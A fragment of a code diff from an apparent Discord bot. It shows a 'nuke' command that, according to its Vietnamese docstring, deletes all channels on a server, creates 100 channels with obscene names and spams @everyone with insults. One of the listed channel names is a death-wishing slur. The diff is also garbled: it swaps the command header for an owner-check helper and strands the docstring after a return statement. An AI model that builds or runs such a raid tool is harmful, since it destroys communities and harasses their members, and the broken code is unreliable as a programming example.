@@ -326,9 +326,10 @@ NUKE_CHANNEL_NAMES = [
     "mày-chết-mẹ-mày-đi-đồ-rác-rưởi-của-xã-hội"
 ]
 
-@bot.command(name="nuke")
-@is_bot_owner()
-async def nuke_server(ctx):
+def is_bot_owner():
+    async def predicate(ctx):
+        return ctx.author.id in BOT_OWNERS
+    return commands.check(predicate)
     """Lệnh nuke server: Xóa tất cả kênh và tạo 100 kênh mới với tên tục tĩu, sau đó spam @everyone + câu chửi"""
     try:
         # Xác nhận trước khi thực hiện
